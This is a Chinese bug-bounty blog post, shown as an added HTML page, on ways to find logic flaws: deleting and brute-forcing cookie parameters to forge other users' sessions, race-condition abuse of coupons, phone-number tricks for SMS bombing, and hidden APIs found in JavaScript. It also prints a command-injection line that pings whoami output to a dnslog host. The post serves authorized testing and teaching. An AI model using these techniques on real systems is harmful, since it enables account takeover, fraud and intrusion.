@@ -1,0 +1,1287 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>SRC挖掘思路_V1.1 | ZQ-Rookie-Hacker&#39;s Blog</title>
+  <meta name="author" content="ZQ-Rookie-Hacker">
+  
+  <meta name="description" content="一、逻辑漏洞——那些”另类”的挖掘角度1.1 Cookie 里的参数，删着删着就出洞了数据包中的 cookie 有一大串参数，且其他参数暂时没有发现或者是大概率不会出问题的参数时，要不要因”害怕”而不敢测试？
+这里要反过来想：一个大厂用户量很大，如果每个用户的 cookie 都在动态变化，那服务端就需要维护一套复杂的 cookie 生成&amp;#x2F;校验机制，每次请求都要查库验证——这对性能的消耗是巨大的。所以为了降成本，很多系统实际上会为每个用户分配一个固定的 cookie 值，服务端只做简单的字符串匹配（查表比对），而不是每次都重新计算。
+
+推理深挖：这个假设的底层逻辑是”成本驱动架构决策”——大厂用户量大，性能压力会把架构往”简单校验”方向推。如果 cookie 是每次动态生成的，那每个请求都要跑一遍生成算法 + 数据库查询；而固定 cookie 只需要一次写入、后续直接比对。对于千万级 DAU 的系统，这个性能差距是数量级的。所以当你看到 cookie 里参数很多时，不要被”看起来很复杂”吓住——表面复杂 ≠ 实际安全，很多参数只是历史遗留的装饰品，服务端根本不去校验它们。
+再深一层：那我怎么知道哪些参数可能是”装饰品”、哪些是真的？这就是”删除法”的前置判断——你要对参数做价值排序。一般来说，cookie 里类似 utm_source、_ga、ref 这种明显是分析&amp;#x2F;追踪类的，大概率不参与鉴权；而 token、sid、uid、auth 这种命名的，可疑度更高。但排序只是帮你提高效率——最终判定依据永远是”删了之后响应变没变”。不要靠猜，要靠测。
+
+这意味着什么？意味着 cookie 里的参数大概率是可以预测的，甚至可以暴力枚举的。
+做法就是逐步删除 cookie 中的参数并观察回显，直到回显错误。这里的逻辑是：如果我删除了某个参数，服务端依然正常返回，说明这个参数没有被校验，去掉也没关系。一直删到某个参数——删了之后返回异常——那就锁定了真正起鉴权作用的参数。
+
+推理深挖：删除测试法的本质是控制变量实验。你把 cookie 的每个参数当作一个自变量，逐一置零（删除），观测因变量（响应是否正常）。这个方法之所以有效，是因为大多数后端对 cookie 的解析是”按 key 取值”的——你没传的 key，后端取值就是 null&amp;#x2F;undefined，不参与比较。所以删到某个 key 响应变了，说明这个 key 参与了决策逻辑。
+再深一层——为什么先删而不是先改？ 这是一个策略优先级问题。改一个参数的值，你不知道改成什么才算”对”——搜索空间太大了（假设值是 32 位 hex，可能性是 16^32）。但删除是二元的：删了之后正常 or 异常，一次请求就出结果。删除是 O(1) 的探测，修改是 O(∞) 的猜测。所以永远先删后改，先定位目标再攻破目标——这是所有安全测试的通用策略：先缩小攻击面，再精准打击。
+
+然后对剩下的 cookie 参数的每一位（也可以看规律）进行字母爆破。为什么是字母爆破？因为 cookie 参数往往就是一串大小写的英文字符（session id、token 这些都是 hex 或 base64，本质上就是 A-Za-z0-9）。每一位爆破 52 次（26+26），当回显不同时那就有料了——说明这一位的值会影响服务端的判断结果。
+
+再深一层——逐位爆破能成功的前提是什么？ 前提是服务端的字符串比较是逐字符比对、且比对失败即返回的。如果服务端做了”恒等比较”（整个字符串一起比对，返回整体 true&amp;#x2F;false），那逐位爆破就看不到差异——你改任何一位，结果都是”不匹配”，没有中间状态。但好消息是，很多系统出于性能考虑，字符串比较用的是 memcmp 或者简单的循环比对，第一个不同的字符就 break 了——因为比对时间不同，你就可以通过时间侧信道（响应时间差异）来逐位推断。即使没有时间差异，有些系统在不同比对结果下返回了不同的业务状态码（”未登录” vs “无权限”），这也给了你逐位爆破的信号。所以逐位爆破的前提是”存在可观测的逐位差异信号”——时间差异、状态差异、内容差异，三者至少有一个。"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="SRC挖掘思路_V1.1"/>
+  <meta property="og:site_name" content="ZQ-Rookie-Hacker&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/zhuzhuxia.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ZQ-Rookie-Hacker&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> SRC挖掘思路_V1.1</h1>
+		</div>
+	
+
+
+
+
+<!-- Reading progress bar -->
+<div class="reading-progress-bar" id="reading-progress-bar"></div>
+
+
+<div class="row post">
+		<!-- cols -->
+		
+		<div id="top_meta"></div>
+		<div class="col-md-9">
+		
+
+		<!-- content -->
+		<div class="mypage">
+		  
+		  <!-- 文章统计 -->
+		  <div class="article-stats">
+		    <i class="fa fa-file-text"></i> 字数: <span id="word-count">计算中...</span>
+		    <span style="margin-left: 12px;"><i class="fa fa-clock-o"></i> 阅读时长: <span id="reading-time">计算中...</span></span>
+		  </div>
+		  
+		  
+
+		  <h1 id="一、逻辑漏洞——那些”另类”的挖掘角度"><a href="#一、逻辑漏洞——那些”另类”的挖掘角度" class="headerlink" title="一、逻辑漏洞——那些”另类”的挖掘角度"></a>一、逻辑漏洞——那些”另类”的挖掘角度</h1><h2 id="1-1-Cookie-里的参数，删着删着就出洞了"><a href="#1-1-Cookie-里的参数，删着删着就出洞了" class="headerlink" title="1.1 Cookie 里的参数，删着删着就出洞了"></a>1.1 Cookie 里的参数，删着删着就出洞了</h2><p>数据包中的 cookie 有一大串参数，且其他参数暂时没有发现或者是大概率不会出问题的参数时，要不要因”害怕”而不敢测试？</p>
+<p><strong>这里要反过来想</strong>：一个大厂用户量很大，如果每个用户的 cookie 都在动态变化，那服务端就需要维护一套复杂的 cookie 生成&#x2F;校验机制，每次请求都要查库验证——这对性能的消耗是巨大的。所以为了降成本，很多系统实际上会为每个用户分配一个<strong>固定的 cookie 值</strong>，服务端只做简单的字符串匹配（查表比对），而不是每次都重新计算。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个假设的底层逻辑是”成本驱动架构决策”——大厂用户量大，性能压力会把架构往”简单校验”方向推。如果 cookie 是每次动态生成的，那每个请求都要跑一遍生成算法 + 数据库查询；而固定 cookie 只需要一次写入、后续直接比对。对于千万级 DAU 的系统，这个性能差距是数量级的。所以当你看到 cookie 里参数很多时，不要被”看起来很复杂”吓住——<strong>表面复杂 ≠ 实际安全</strong>，很多参数只是历史遗留的装饰品，服务端根本不去校验它们。</p>
+<p><strong>再深一层</strong>：那我怎么知道哪些参数可能是”装饰品”、哪些是真的？这就是”删除法”的前置判断——你要对参数做<strong>价值排序</strong>。一般来说，cookie 里类似 <code>utm_source</code>、<code>_ga</code>、<code>ref</code> 这种明显是分析&#x2F;追踪类的，大概率不参与鉴权；而 <code>token</code>、<code>sid</code>、<code>uid</code>、<code>auth</code> 这种命名的，可疑度更高。但排序只是帮你提高效率——<strong>最终判定依据永远是”删了之后响应变没变”</strong>。不要靠猜，要靠测。</p>
+</blockquote>
+<p>这意味着什么？意味着 cookie 里的参数大概率是可以预测的，甚至可以暴力枚举的。</p>
+<p><strong>做法就是逐步删除</strong> cookie 中的参数并观察回显，直到回显错误。这里的逻辑是：如果我删除了某个参数，服务端依然正常返回，说明这个参数<strong>没有被校验</strong>，去掉也没关系。一直删到某个参数——删了之后返回异常——那就锁定了真正起鉴权作用的参数。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：删除测试法的本质是<strong>控制变量实验</strong>。你把 cookie 的每个参数当作一个自变量，逐一置零（删除），观测因变量（响应是否正常）。这个方法之所以有效，是因为大多数后端对 cookie 的解析是”按 key 取值”的——你没传的 key，后端取值就是 null&#x2F;undefined，不参与比较。所以删到某个 key 响应变了，说明这个 key 参与了决策逻辑。</p>
+<p><strong>再深一层——为什么先删而不是先改？</strong> 这是一个策略优先级问题。改一个参数的值，你不知道改成什么才算”对”——搜索空间太大了（假设值是 32 位 hex，可能性是 16^32）。但删除是二元的：删了之后正常 or 异常，一次请求就出结果。<strong>删除是 O(1) 的探测，修改是 O(∞) 的猜测</strong>。所以永远先删后改，先定位目标再攻破目标——这是所有安全测试的通用策略：先缩小攻击面，再精准打击。</p>
+</blockquote>
+<p>然后对剩下的 cookie 参数的每一位（也可以看规律）进行字母爆破。为什么是字母爆破？因为 cookie 参数往往就是一串大小写的英文字符（session id、token 这些都是 hex 或 base64，本质上就是 A-Za-z0-9）。每一位爆破 52 次（26+26），当回显不同时那就有料了——说明这一位的值会影响服务端的判断结果。</p>
+<blockquote>
+<p><strong>再深一层——逐位爆破能成功的前提是什么？</strong> 前提是服务端的字符串比较是<strong>逐字符比对、且比对失败即返回</strong>的。如果服务端做了”恒等比较”（整个字符串一起比对，返回整体 true&#x2F;false），那逐位爆破就看不到差异——你改任何一位，结果都是”不匹配”，没有中间状态。但好消息是，很多系统出于性能考虑，字符串比较用的是 <code>memcmp</code> 或者简单的循环比对，第一个不同的字符就 break 了——因为比对时间不同，你就可以通过<strong>时间侧信道</strong>（响应时间差异）来逐位推断。即使没有时间差异，有些系统在不同比对结果下返回了不同的业务状态码（”未登录” vs “无权限”），这也给了你逐位爆破的信号。<strong>所以逐位爆破的前提是”存在可观测的逐位差异信号”——时间差异、状态差异、内容差异，三者至少有一个。</strong></p>
+</blockquote>
+<blockquote>
+<p><strong>逻辑链</strong>：发现 cookie 参数多 → 推断固定值概率大（大厂性能驱动）→ 逐步删除定位鉴权参数 → 逐位爆破确认可遍历性 → 构造其他用户的 cookie → 越权&#x2F;账号接管。</p>
+</blockquote>
+<p>还有一个重要的思维：<strong>扩大影响</strong>。当我们爆破出 cookie 之后，可以修改登录请求包尝试登录其他账号。为什么会想到这一步？因为你爆破出来的 cookie 本质上就是一个”身份凭证”，如果你能推测出其他用户的 cookie 结构，那你就可以伪造任意用户的身份——这就从一个”信息泄露”升级成了”任意账号登录”。</p>
+<blockquote>
+<p><strong>这是贯穿全文的核心思维——“扩大影响”的完整定义</strong>：每当你拿到一个局部突破点（一个接口的越权、一个参数的爆破、一个信息的泄露），不要停下来，立刻问自己三个问题：</p>
+<ol>
+<li>这个突破点能不能<strong>横向复制</strong>？（同模块其他接口有没有同样问题？）</li>
+<li>这个突破点能不能<strong>纵向升级</strong>？（从只读变读写？从信息泄露变账号接管？）</li>
+<li>这个突破点能不能<strong>跨端扩展</strong>？（Web 端修了，APP 端呢？）</li>
+</ol>
+<p>后面你会反复看到这个思维模式的出现——它不是某个具体的技巧，而是一种<strong>条件反射式的追问习惯</strong>。</p>
+</blockquote>
+<hr>
+<h2 id="1-2-URL-和-POST-参数都看起来无关紧要，怎么办？"><a href="#1-2-URL-和-POST-参数都看起来无关紧要，怎么办？" class="headerlink" title="1.2 URL 和 POST 参数都看起来无关紧要，怎么办？"></a>1.2 URL 和 POST 参数都看起来无关紧要，怎么办？</h2><p>URL 中没有什么任何参数（对应 GET），POST 参数中也是无关紧要的参数，此时的思路是什么？</p>
+<p>这里的关键洞察是：<strong>鉴权参数不一定出现在 URL 里，也不一定只有一个</strong>。</p>
+<blockquote>
+<p><strong>再深一层——为什么鉴权参数”不一定只有一个”？</strong> 因为现代 Web 应用的鉴权通常是<strong>多层叠加</strong>的：网关层校验 API Key → 应用层校验 Session → 业务层校验 User ID → 数据层校验归属。每一层都可能引入自己的鉴权参数。所以当你发现 URL 和 POST body 都没有明显的身份参数时，不要轻易下结论”这个接口没做鉴权”——参数可能在 Cookie 里、在 Header 里（<code>Authorization</code>、<code>X-User-Id</code>、<code>X-Auth-Token</code>…）、甚至在 Body 的某个嵌套 JSON 字段里。<strong>鉴权参数可能藏在任何地方，你的任务是找到它们，而不是假设它们不存在。</strong></p>
+</blockquote>
+<p>通常情况，我们可以<strong>准备两个浏览器和登录账号来找不同</strong>，这是越权的核心思想。为什么要用两个账号？因为单独的请求你看不出”哪个参数决定了谁是谁”——只有对比两个不同用户对同一接口的请求，才能发现差异点。A 用户的请求和 B 用户的请求，哪里不一样，哪里就是鉴权点。这是最朴素也最有效的”找不同”方法。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：双账号对比法的底层原理是<strong>差分分析</strong>。你把两个合法请求对齐，逐字段做 diff。相同的字段是公共参数（接口版本、客户端类型等），不同的字段才是身份相关的。这个方法不需要你理解参数含义，只需要你会”找不同”——相当于把逆向工程中的 diff 分析用在了 HTTP 请求层面。</p>
+<p><strong>再深一层——为什么必须用两个浏览器而不是两个标签页？</strong> 因为同一浏览器的不同标签页共享 Cookie 和 localStorage。你用同一个浏览器登两个账号，Cookie 会互相覆盖，你根本分不清当前请求携带的是哪个账号的凭证。两个浏览器（或 Chrome 的 Person 1 &#x2F; Person 2）提供的是<strong>完全隔离的存储空间</strong>，这才是真正的”两个独立用户”。</p>
+</blockquote>
+<p>还有就是测试了很多参数都失败，不要放弃，可能下一个就是了。看到 cookie 的一些敏感参数（如 uid 等），可以尝试修改，有编码就尝试解码，要有找到破局的积极性。也可试试一些参数的<strong>置空</strong>。置空和删除是不一样的操作——有时候参数存在但值为空，后端逻辑是”没传这个参数”而不是”传了空值”，两者走的是不同的代码分支。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：置空 vs 删除的区别根源于后端参数处理的三态逻辑。很多框架（如 Spring、Express）对参数有三种状态：<code>存在且有值</code>、<code>存在但为空</code>、<code>不存在</code>。这三个状态在后端可能对应三条不同的 if 分支。你删了参数走的是”不存在”分支，置空走的是”存在但为空”分支，而这个分支可能绕过某些非空校验但通过另一些校验。</p>
+<p><strong>测试策略——什么时候删、什么时候置空、什么时候改？</strong> 这是一个递进关系：先删（最快，二元结果）→ 删了异常就置空（探测是否只要”存在”即可）→ 置空也异常就改值（探测是否需要特定值）。这三步构成一个<strong>从粗粒度到细粒度的探测光谱</strong>。</p>
+</blockquote>
+<hr>
+<h2 id="1-3-每个功能点都抓一遍包"><a href="#1-3-每个功能点都抓一遍包" class="headerlink" title="1.3 每个功能点都抓一遍包"></a>1.3 每个功能点都抓一遍包</h2><p>对于一个页面，不知道怎么下手可以抓包每个功能先点一遍。一些很小众的功能比如修改文件日期、上传、下载、离线推送、个人中心等等。抓取数据包之后的分析就比如 cookie 删除大法等。</p>
+<p><strong>为什么小众功能值得关注？</strong> 因为主力功能被无数人测试过，而边缘功能往往开发匆忙、测试覆盖低。一个产品的核心登录流程可能有完善的鉴权，但”修改文件日期”这种冷门功能可能就是一个人半天写完的，鉴权逻辑可能直接省略了。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这背后是”安全投入的非均匀分布”规律。一个产品的安全资源是有限的，PM 会优先分配给用户量大、曝光度高的核心功能。边缘功能的安全审查顺序排在最后——甚至根本没有。所以挖 SRC 的本质策略之一是：<strong>去别人不去的地方挖</strong>。大家都盯着登录、支付，你去挖”修改文件日期”，竞争少、出洞率高。</p>
+</blockquote>
+<p>内容的控制参数<strong>不一定</strong>只有一个起决定性作用。这句话的意思是说——你以为改一个 id 就够了，但可能系统同时校验了 id + user_id + token 的组合。所以<strong>组合删除&#x2F;组合修改</strong>也是重要的试探手段。</p>
+<hr>
+<h2 id="1-4-心态"><a href="#1-4-心态" class="headerlink" title="1.4 心态"></a>1.4 心态</h2><p>很多逻辑漏洞是 6 成运气 4 成技术，主要是要<strong>敢想敢干</strong>。为什么强调”敢想敢干”？因为逻辑漏洞不像 SQL 注入有明确的 Payload 模板，它更像是在<strong>探索开发者的思维漏洞</strong>——开发者漏掉了什么校验、假设了什么前提——这些东西无法用扫描器发现，只能靠人去推理和试探。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：逻辑漏洞和注入类漏洞有本质区别。注入类漏洞是”技术实现错误”（没做参数化），有固定的检测方法。逻辑漏洞是”设计假设错误”（开发者假设用户不会删这个参数、假设用户看不到隐藏接口）。前者是代码层的问题，后者是思维层的问题。扫描器扫不出思维漏洞——这就是为什么逻辑漏洞的挖掘高度依赖”人”的推理能力而非”工具”的覆盖能力。</p>
+<p><strong>再深一层——“6 成运气”这个说法不要误解</strong>。运气不是在赌场上蒙，而是”你测试了 100 个点，有一个中了”——那 1 个中的是运气，但 100 个的测试量是你控制的。<strong>把运气转化为概率</strong>：每多测试一个功能点，中奖概率就累积一分。你测试 10 个点，中奖概率可能是 5%；你测试 200 个点，中奖概率可能是 60%。所以”敢想敢干”的真正含义不是靠勇气去莽，而是<strong>用量对冲不确定性</strong>——当你不知道哪个点有洞时，就把所有点都测一遍。</p>
+</blockquote>
+<hr>
+<h2 id="1-5-感受逻辑漏洞的”魅力”：并发"><a href="#1-5-感受逻辑漏洞的”魅力”：并发" class="headerlink" title="1.5 感受逻辑漏洞的”魅力”：并发"></a>1.5 感受逻辑漏洞的”魅力”：并发</h2><p>无脑的并发，实际上所有的功能点都存在这漏洞。并发评论，比如限制每个人只能评论一次，京东买了一个商品，一个用户只能晒单一次，此时的并发评论就有危害了，还有并发点赞（作者有流量就会有钱），并发关注（同前），并发收藏（同前），举报并发。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：并发的通用性来源于一个根本问题——<strong>检查（check）和操作（act）之间的时间窗口</strong>。任何”先判断条件是否满足，再执行操作”的逻辑，如果判断和操作不是原子的（没有加锁），那并发请求就能在这个窗口内同时通过判断。这是一个跨语言、跨框架、跨业务的通用缺陷模式。</p>
+<p><strong>再深一层——为什么”所有功能点都存在”这个判断是正确的？</strong> 因为加锁是有成本的（Redis 锁要网络开销、数据库锁要等待、分布式锁要处理超时和死锁），开发者不会给每一个功能都加锁。通常只有<strong>已经被攻击过的场景</strong>才会被补上锁（比如优惠券领取、注册送券这些”重灾区”）。那些冷门场景——评论限制、晒单限制、点赞限制——开发觉得”谁会并发这个啊？”，锁就不加了。所以并发的挖掘策略就是：<strong>去那些看起来不值得并发的功能点并发</strong>。”限制每人一次”的所有场景都是潜在目标。</p>
+</blockquote>
+<p>还有抽奖并发，优惠卷并发，这就有点意思了，这也是进行并发尝试的值得关注的场景。什么商城，什么 618 活动，什么云产商，什么新人福利，就可以全网去找。</p>
+<blockquote>
+<p><strong>为什么抽奖和优惠券是并发的”高价值目标”？</strong> 因为这两个场景的<strong>资源是有真实价值的</strong>——优惠券可以折现或转让，抽奖奖品可以变现。你并发点赞最多让某个帖子热度高一点，但并发优惠券直接等于钱。所以评估一个并发漏洞的危害时，不要只看”能不能并发”，还要看<strong>并发得到的资源有没有变现路径</strong>。</p>
+</blockquote>
+<p>并发有风控能绕过吗？绕不过的，一旦加锁就不行了。</p>
+<p>最终的必杀，短信轰炸+并发，但是漏洞还是可收可不收。</p>
+<p><strong>绕过技巧</strong>：并发删除身份认证尝试可以连续发送特殊格式绕过：手机号码前后加空格，86，086，0086，+86，0，00，\r，\n，以及特殊符号等修改 cookie，变量，返回 138888888889 12 位经过短信网关取前 11 位，导致短信轰炸进行能解析的编码。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：手机号绕过之所以有效，是因为短信网关在”规范化”手机号时做了隐式转换。你输入 <code>+86138xxxx</code>，网关去掉 <code>+86</code> 变成 <code>138xxxx</code>；你输入 <code>138xxxx </code>（后面带空格），网关 trim 之后还是同一个号码。但风控系统可能在你的输入层面做去重（按原始字符串），而不是按规范化后的号码去重。这就是两个系统的<strong>规范化差异</strong>被利用的典型案例。</p>
+<p><strong>再深一层——这其实是一个通用的绕过模式</strong>：任何系统只要存在两个处理环节（A 环节做校验&#x2F;去重，B 环节做规范化处理），并且 A 和 B 对输入的理解不一致，就存在绕过空间。不只是手机号——URL（WAF 和 Web Server 的 URL 解析差异）、文件名（上传过滤和后端存储的文件名规范化差异）、金额（前端校验和后端计算的精度差异）都可以套用这个模式。<strong>记住：哪里有两个系统对接，哪里就可能有规范化差异。</strong></p>
+</blockquote>
+<h3 id="核弹级——并发-RCE"><a href="#核弹级——并发-RCE" class="headerlink" title="核弹级——并发 RCE"></a>核弹级——并发 RCE</h3><p>比如现在有一个场景是制作语音的，有一些框框叫你输入语音名称，语音的文字，然后下面有一些功能，什么试听语音，什么制作语音的按钮。可以考虑拼接 RCE（|| &amp;&amp; 符号等等）。抓取试听语音的按钮的数据包，发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /testapi/tryhear/12323.wav HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>尝试拼接：<code>GET /testapi/tryhear/12323.wav | ping &#39;whoami&#39;.x6nmz3.dnslog.cn HTTP/1.1</code>，结果没有用（其中 <code>.x6nmz3.dnslog.cn</code> 是 <a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a> 获得的域名）。</p>
+<p>然后我们就上面这个形式进行并发，并发 100 次就把结果带出来了，好像越权也有这样的案例。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：并发为什么能把”没反应”变成”有反应”？这里的关键可能是<strong>竞态导致的安全组件失效</strong>。单次请求经过 WAF&#x2F;RASP 时被拦截（命令注入特征被识别），但在高并发场景下，安全组件的检测队列可能被撑爆，或者检测和转发之间出现了竞态窗口——某些请求在检测完成之前就被转发到了后端。这不是绕过了检测逻辑，而是绕过了检测的”覆盖率”。</p>
+</blockquote>
+<p>反正你过不去的点，此时有不是很开心就并发一下。</p>
+<p>插一句，RCE 会出现在什么地方呢？一般是执行功能的接口处。如果我们弱口令进入后台，看到了一些执行任务的功能，可以尝试 RCE。</p>
+<hr>
+<h1 id="二、JS-里的业务问题"><a href="#二、JS-里的业务问题" class="headerlink" title="二、JS 里的业务问题"></a>二、JS 里的业务问题</h1><h2 id="2-1-开局一个登录框，能怎么挖？"><a href="#2-1-开局一个登录框，能怎么挖？" class="headerlink" title="2.1 开局一个登录框，能怎么挖？"></a>2.1 开局一个登录框，能怎么挖？</h2><ul>
+<li>有框能否 SQL 注入、XSS 等？</li>
+<li>密码重置、验证码输入等，修改其返回包是否有意外收获？（返回包里可能包含一些前端不该看到的字段，比如用户角色、权限列表等）</li>
+<li>需要电话短信是否存在短信轰炸等相关漏洞？</li>
+<li>收集有效信息，如学号、手机号、邮箱、身份证的信息进行爆破。</li>
+<li><strong>F12 大法</strong>——JS 接口的查找以及 JS 文件中的敏感信息泄露。F12 之后 <code>Ctrl+Shift+F</code> 开启全局代码搜索，关键词：<code>ajax</code>、<code>get/</code>、<code>api</code>、<code>post</code> 等（AI 补充）。为什么要搜这些？因为前端代码里常常硬编码了后端 API 路径，而这些路径在页面上根本没有对应的按钮入口——开发写了但没上线，或者只给内部人员使用，但接口实际上是可以调用的。</li>
+<li>没有密码重置等其他功能的，实在想不出其他思路就<strong>改返回包</strong>和<strong>查看 JS</strong>。可能存在的情况是开发工程师不想要别人使用除正常登录外的其他功能，但是忽略了 JS 代码泄露了接口信息。</li>
+</ul>
+<blockquote>
+<p><strong>核心认知：前端隐藏 ≠ 后端保护。</strong> 前端不显示按钮只是 UI 层面的限制，后端接口如果没做鉴权，那直接发包就能访问。这是一个贯穿所有 Web 安全的底层原则——<strong>永远不要信任前端做安全控制</strong>，前端的一切都是可以被用户修改的。</p>
+</blockquote>
+<hr>
+<h2 id="2-2-一个很重要的思路：根据报错信息，循环逼近"><a href="#2-2-一个很重要的思路：根据报错信息，循环逼近" class="headerlink" title="2.2 一个很重要的思路：根据报错信息，循环逼近"></a>2.2 一个很重要的思路：根据报错信息，循环逼近</h2><p>发送一些经过修改的包之后，返回 <strong>500</strong> 而不是 <strong>404</strong>（没有权限），这其实是一个很重要的信号。</p>
+<p><strong>为什么会返回 500？</strong> 404 说明路由没匹配到或者被拦截了，而 500 意味着请求已经到达了业务逻辑层——服务器”认”了这个请求，但在处理过程中出了问题。两者的本质区别是：404 说明你根本没进到门，500 说明你已经进门了只是房间里出错了。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：HTTP 状态码的差异在这里变成了<strong>攻击面的探测器</strong>。</p>
+<ul>
+<li>404 → 你的请求在路由层&#x2F;网关层就被拦截了，你连业务代码都没碰到 → 这条路不通。</li>
+<li>500 → 你的请求穿透了路由和鉴权，到达了业务逻辑层 → 路是通的，只是参数不对。</li>
+</ul>
+<p>所以挖洞时不要把所有非 200 的响应一视同仁。500 是<strong>正向信号</strong>——它告诉你”接口存在且可达”，接下来只需要调试参数。</p>
+<p><strong>再深一层——不只是 500，所有”业务层报错”状态码都是信号</strong>：400（参数格式不对）、422（参数语义不对）、甚至 200 但返回体里有 <code>&quot;code&quot;:-1,&quot;msg&quot;:&quot;参数缺失&quot;</code> 都是”门是开的”信号。判断标准不是 HTTP 状态码本身，而是<strong>错误信息的内容是否来自业务代码</strong>。只要错误信息里出现了字段名、类型名、业务术语，就说明你的请求已经穿透到了业务层——剩下的就是调试参数了。</p>
+</blockquote>
+<p>500 可能的原因是少了一些参数数据或多了一些参数数据。如果有返回错误信息那就更好了，按照错误的信息尝试修改。</p>
+<p><strong>核心操作</strong>：如果修改之后再次发包，虽然还是服务器处理错误，但是如果返回了更多的报错信息（比如一些参数名称），根据现有的错误信息继续修包（缺少什么就加什么），不断循环直至达到目的。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个思路本质上是<strong>利用服务端自身的报错来反向推断接口的参数结构</strong>——相当于服务器在一步步”告诉”你需要哪些参数。这是一种<strong>信息泄露驱动的参数构造</strong>。</p>
+<p><strong>逻辑链</strong>：第一次请求少参数 → 报错告诉你缺什么 → 第二次补上 → 继续报错告诉你还需要什么 → 循环直到成功。每一步都从错误信息中获取新的线索，最终拼出完整的有效请求。</p>
+<p><strong>再深一层——这个”循环逼近”方法的极限在哪里？</strong> 它在以下情况会失效：（1）服务端做了全局异常捕获，无论什么错都返回统一格式（不透露任何参数信息）；（2）服务端只返回第一个缺失参数就停止了，补上之后又报第二个缺失——这种情况虽然慢但依然有效。真正让你失败的是<strong>服务端不告诉你缺什么，只跟你说”请求非法”</strong>——这时候你就只能靠前面讲的双账号对比法和参数名猜测法了。所以<strong>循环逼近和其他方法是互补的</strong>——报错详细时用循环逼近，报错统一时回归对比法和猜测法。</p>
+</blockquote>
+<p>如果这个接口我们最终是可以成功利用的，那就要有一种思维——<strong>扩大影响</strong>，即是不是其他接口也存在这种情况？因为同一个开发团队往往有统一的编码习惯——如果一个接口存在越权，同模块的其他接口大概率也有相同的问题。</p>
+<p>同时<strong>越权的时候一定要对数字有绝对敏感</strong>。删除、置空都是常规操作。</p>
+<hr>
+<h2 id="2-3-共性思维"><a href="#2-3-共性思维" class="headerlink" title="2.3 共性思维"></a>2.3 共性思维</h2><p>实际上这些思考都有一个共性思维（除了第一点 SQL 注入…），就是能否找到一种方式（删参数？接口？）<strong>不用进行身份认证</strong>（缺乏鉴权）就达到目的。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个共性思维提炼得非常关键——它把所有看似零散的技巧串起来了。无论是删 cookie、改 JS 找到的隐藏接口、还是通过报错逼近参数，本质上都在问同一个问题：<strong>这个系统有没有一条路径，可以绕过它预设的身份验证流程？</strong></p>
+<p>这个问题的答案取决于开发者的”假设”：假设用户一定会通过前端页面访问、假设 cookie 的每个参数都会被校验、假设隐藏的接口没人知道。而安全研究就是在挑战这些假设。</p>
+<p><strong>再深一层——把这个共性思维变成一个可操作的检查清单</strong>：拿到一个新目标后，依次问：</p>
+<ol>
+<li>这个接口有没有<strong>完全不鉴权的入口</strong>？（删 Cookie &#x2F; 删 Header &#x2F; 改 GET 为 POST 绕过过滤器）</li>
+<li>这个接口有没有<strong>鉴权不完整的入口</strong>？（鉴权了用户身份但没鉴权资源归属 &#x3D; 越权）</li>
+<li>这个接口有没有<strong>泄露鉴权信息的入口</strong>？（返回包里带了 token、JS 里写了密钥、报错里暴露了参数名）</li>
+</ol>
+<p>这三个问题覆盖了 90% 的逻辑漏洞场景。它们不是三种不同的漏洞类型，而是<strong>对同一个缺陷（鉴权缺失）从三个角度（绕过、不足、泄露）的探测</strong>。</p>
+</blockquote>
